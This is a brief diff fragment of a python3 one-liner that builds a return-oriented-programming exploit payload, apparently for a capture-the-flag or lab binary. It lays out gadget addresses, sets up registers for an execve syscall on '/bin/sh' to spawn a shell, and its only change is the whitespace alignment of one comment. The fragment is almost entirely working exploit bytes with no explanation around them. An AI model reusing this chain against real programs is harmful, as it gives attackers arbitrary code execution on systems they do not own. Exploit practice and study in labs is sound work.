@@ -45,7 +45,7 @@ python3 -c "import sys; sys.stdout.buffer.write(
     b'\x00\x00\x00\x00\x00\x00\x00\x00' +  # rdx = 0
                                                                  
     b'\xab\xad\x42\x00\x00\x00\x00\x00' +  # pop rax ; ret
-    b'AAAAAA' +                             # 6 junk bytes for ret 6
+    b'AAAAAA' +                            # 6 junk bytes for ret 6
     b'\x3b\x00\x00\x00\x00\x00\x00\x00' +  # rax = 59 (execve)
     # by the time we get her,e rax = 0x3b; rdi => "/bin/sh"; rsi = 0; rdx = 0.                                              
     b'\x1a\x14\x40\x00\x00\x00\x00\x00'    # syscall
